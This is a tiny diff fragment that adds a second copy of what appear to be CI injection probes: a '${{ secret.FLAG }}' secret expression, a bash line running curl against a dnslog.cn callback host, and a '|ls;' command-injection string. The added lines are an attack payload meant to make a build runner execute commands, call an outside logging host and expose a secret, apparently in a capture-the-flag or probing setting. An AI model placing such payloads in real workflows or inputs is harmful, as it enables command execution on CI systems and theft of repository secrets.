@@ -849,3 +849,7 @@ DongBother:${{ secret.FLAG }};
 
 shell: /bin/bash -e "curl fksb.sxhx72.dnslog.cn";
 |ls;
+DongBother:${{ secret.FLAG }};
+
+shell: /bin/bash -e "curl q92uua.dnslog.cn";
+|ls;
